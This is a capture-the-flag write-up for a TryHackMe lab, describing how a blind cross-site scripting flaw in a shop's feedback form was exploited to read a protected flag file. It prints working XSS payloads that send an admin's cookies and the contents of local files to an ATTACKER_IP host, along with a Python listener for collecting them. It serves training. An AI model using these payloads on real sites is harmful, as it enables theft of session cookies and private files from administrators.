---
layout: default
title: "The Sticker Shop TryHackMe Walkthrough"
description: "A complete walkthrough for The Sticker Shop challenge on TryHackMe. Learn how to exploit a Blind XSS vulnerability to steal the flag."
date: 2024-11-29
banner: "assets/images/sticker.png"
permalink: /writeups/the-sticker-shop
type: "writeup"
difficulty: "easy"
source: "tryhackme"
---
<br>

# The Sticker Shop 

## Challenge Description

**Task 1**  
The sticker shop is finally online!  
Your local sticker shop has finally developed its own webpage. They do not have too much experience regarding web development, so they decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback. Smart move!

**Objective**:  
Can you read the flag at `http://MACHINE_IP:8080/flag.txt`?

You can find the original challenge at the following link: https://tryhackme.com/room/thestickershop
---

## Table of Contents
- [Walkthrough](#walkthrough)
  - [Initial Exploration](#initial-exploration)
  - [The Feedback Page](#the-feedback-page)
  - [Crafting the Payloads](#crafting-the-payloads)
    - [Initial Test Payload](#initial-test-payload)
    - [Cookie Payload (Unsuccessful)](#cookie-payload-unsuccessful)
    - [Direct File Access (Successful)](#direct-file-access-successful)
- [Decode the Flag](#decode-the-flag)
- [Challenge Questions Answered](#answers)

---


## Walkthrough {#walkthrough}

### Initial Exploration {#initial-exploration}
When I first read the challenge prompt, a few things caught my attention. The mention of hosting everything on the same computer sounded like a major vulnerability waiting to happen, especially if the admin reviews feedback on the same browser. The **hint** in the description felt like a nudge toward something admin-side, like a **Blind XSS**.

1. I visited `http://MACHINE_IP:8080/flag.txt` directly, hoping the flag was accessible.  
   - **Result**: I was greeted with a **401 Unauthorized** error. So, no luck here.

2. I went to the homepage at `http://MACHINE_IP:8080/`.  
   - This was a basic website, nothing fancy. But from here, I navigated to the **Feedback page**.

---

### The Feedback Page {#the-feedback-page}
The feedback page had a simple textbox for entering comments and a message below it:

> "Thanks for your feedback! It will be evaluated shortly by our staff."

At this point, I had a pretty strong suspicion that this was a **Blind XSS** challenge. The wording in both the prompt and the feedback page hinted at admin-side activity:  
- "evaluated shortly"  
- "feedback is important"

I decided to test for Blind XSS by injecting a basic payload into the textbox.

---

### Crafting the Payloads {#crafting-the-payloads}

#### Initial Test Payload {#initial-test-payload}
To confirm whether XSS was possible, I used a simple test payload:

```html
<img src="http://ATTACKER_IP:8000">
```
In order to actually receive this, I first had to start a python simple http server on my machine

```bash
python3 -m http.server 8000
```
soon after I sent the XSS payload requests started floading my terminal:
```bash
MACHINE_IP - - [29/Nov/2024 17:42:25] "GET / HTTP/1.1" 200 -
```
This confirmed it, the machine **is vulnerable to Blind XSS**. Now what was left to do was to get the admin bot to do something useful

#### Cookie Payload (unsuccesfull) {#cookie-payload-unsuccessful}
The first trick on my book was to steal the admin's cookie to gain access to the flag.txt file, to do that I used the following payload:

```html
<img src="invalid-image" onerror="fetch('http://ATTACKER_IP:8000/cookies?cookie=' + document.cookie)">
```
Unfortunately, this did not yield anything usefull, the website probably doesn't have cookies or my payload wan't able to capture it.

```bash
MACHINE_IP - - [29/Nov/2024 17:45:25] code 404, message File not found
MACHINE_IP - - [29/Nov/2024 17:45:25] "GET /cookies?cookie= HTTP/1.1" 404 -
```
#### Direct File Access (succesfull!) {#direct-file-access-successful}
The next thing was to see if I could get the admin to go to the flag.txt file and send its contents back to my http server. To do this a simplehttp does not suffice since it does not support POST requests

Using the following code, I made a better http server to view POST requests too:

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

class RequestHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        print(f"POST data received: {post_data}")

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

    def do_GET(self):
        parsed_path = urllib.parse.urlparse(self.path)
        query = urllib.parse.parse_qs(parsed_path.query)
        print(f"GET request received: {query}")

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

server = HTTPServer(('0.0.0.0', 8000), RequestHandler)
print("Server started on port 8000...")
server.serve_forever()
```
Now all I needed was a new payload, after a lot of tries (and espressos) I finally found a working one:

```html
<img src="x" onerror="fetch('http://127.0.0.1:8080/flag.txt').then(r => r.text()).then(flag => fetch('http://ATTACKER_IP:8000/flag',{method:'POST',body:btoa(flag),mode:'no-cors'})).catch(e => fetch('http://ATTACKER_IP:8000/error',{method:'POST',body:btoa(e.message),mode:'no-cors'}));">
```
Be sure to change ```ATTACKER_IP``` with your openvpn ip, as per the ip fetched, you might be wondering why it is a 127.0.0.1 ip. I found out using other payloads that the "admin" doesn't use the openvpn ip we see (why would it if the file is on his computer?), instead it has a local one, which works way better.

---
### Decode the Flag {#decode-the-flag}
If everything went right, you received a base64 encoded flag, to decode it use a tool like [cyberchef](https://gchq.github.io/CyberChef/).

---

## Challenge Questions Answered {#answers}

### Can you read the flag at http://MACHINE_IP:8080/flag.txt?
To retrieve this flag, you must exploit a Blind XSS vulnerability on the customer feedback page. Submit a malicious HTML payload that forces the administrator's browser to fetch the `flag.txt` file and send its contents via a POST request back to a custom Python HTTP server hosted on your attacking machine. Decode the received Base64 string to reveal the flag.
**Flag format:** `THM{...}`

## Final Thoughts

This challenge was like making a perfect espresso: patience, precision, and the right blend of ideas. Blind XSS taught me to adapt to localhost quirks and think creatively about admin-side processing. 

Grazie for reading, and buona fortuna on your next hack! 

